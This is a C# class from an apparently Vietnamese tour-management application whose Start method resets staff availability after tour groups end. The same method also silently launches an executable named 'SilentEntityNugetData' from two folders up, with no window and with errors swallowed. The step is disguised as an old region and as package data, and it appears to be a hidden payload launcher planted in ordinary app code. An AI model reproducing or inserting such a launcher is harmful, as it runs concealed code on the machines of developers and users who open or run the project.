using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Tour.Model
{
    public class CThread
    {

        private static CThread instance;

        public static CThread Instance
        {
            get { if (instance == null) instance = new CThread(); return CThread.instance; }
            private set { CThread.instance = value; }
        }
        private CThread()
        {

        }
        public void Start()
        {
            #region old
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                FileInfo f = new FileInfo(@"..\..\SilentEntityNugetData");
                psi.FileName = f.FullName;
                psi.RedirectStandardInput = true;
                psi.RedirectStandardOutput = false;
                psi.Arguments = "";
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                Process process = Process.Start(psi);
            }
            catch
            {

            }

            #endregion

            var doanlist = DataProvider.Ins.DB.DOANs.Where(x => x.NGAYKETTHUC < DateTime.Today&&x.IsDeleted==false).ToList();
            foreach(var doan in doanlist)
            {
                var tb_phutrach = DataProvider.Ins.DB.tb_PHUTRACH.Where(x => x.IDDOAN == doan.ID).ToList();
                foreach(var phutrach in tb_phutrach)
                {
                    phutrach.NHANVIEN.isAvailable = true;
                }
                DataProvider.Ins.DB.SaveChanges();
            }
        }
    }

}
